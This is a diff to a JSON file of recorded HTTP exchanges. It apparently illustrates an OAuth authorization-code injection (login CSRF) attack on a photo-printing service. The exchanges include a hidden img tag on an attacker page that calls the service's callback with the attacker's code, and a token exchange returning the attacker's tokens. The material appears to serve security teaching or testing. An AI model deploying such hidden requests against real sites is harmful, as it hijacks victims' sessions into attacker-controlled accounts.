@@ -77,14 +77,20 @@
         "request": {
           "method": "GET",
           "url": "https://evil.example/page-piégée",
-          "headers": { "Host": "evil.example" }
+          "headers": {
+            "Host": "evil.example"
+          }
         },
         "response": {
           "status": 200,
           "statusText": "OK",
           "body": {
             "type": "html",
-            "content": "<!-- page anodine en apparence -->\n<img src=\"https://photoprint.example/callback?code=AttackerC0deXYZ\" style=\"display:none\">"
+            "content": "<!-- page anodine en apparence -->\n<img src=\"https://photoprint.example/callback?code=AttackerC0deXYZ\" style=\"display:none\">",
+            "representation": "excerpt"
+          },
+          "headers": {
+            "Content-Type": "text/html"
           }
         }
       }
@@ -120,7 +126,8 @@
           },
           "body": {
             "type": "form",
-            "content": "grant_type=authorization_code&code=AttackerC0deXYZ&redirect_uri=https%3A%2F%2Fphotoprint.example%2Fcallback"
+            "content": "grant_type=authorization_code&code=AttackerC0deXYZ&redirect_uri=https%3A%2F%2Fphotoprint.example%2Fcallback",
+            "representation": "wire"
           }
         },
         "response": {
@@ -128,7 +135,11 @@
           "statusText": "OK",
           "body": {
             "type": "json",
-            "content": "{ \"access_token\": \"…tokens du compte de l'attaquant…\", \"token_type\": \"Bearer\", \"expires_in\": 3600 }"
+            "content": "{ \"access_token\": \"…tokens du compte de l'attaquant…\", \"token_type\": \"Bearer\", \"expires_in\": 3600 }",
+            "representation": "excerpt"
+          },
+          "headers": {
+            "Content-Type": "application/json"
           }
         }
       }
